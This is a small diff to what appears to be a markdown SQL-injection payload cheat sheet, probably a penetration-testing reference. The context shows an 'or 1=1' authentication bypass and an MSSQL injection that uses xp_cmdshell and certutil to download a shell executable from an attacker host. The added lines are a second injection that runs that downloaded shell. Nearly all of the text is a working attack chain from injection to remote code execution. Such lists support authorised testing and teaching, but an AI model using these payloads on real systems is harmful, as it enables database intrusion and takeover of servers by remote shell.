@@ -332,6 +332,9 @@ admin' or '1'='1
 ```ps
 ';exec xp_cmdshell 'certutil -urlcache -f http://<attacker-ip>/shell-x64.exe c:/temp/shell-x64.exe';--
 ```
+```ps
+';exec xp_cmdshell 'c:/temp/shell.exe';--
+```
 
 </details>
 
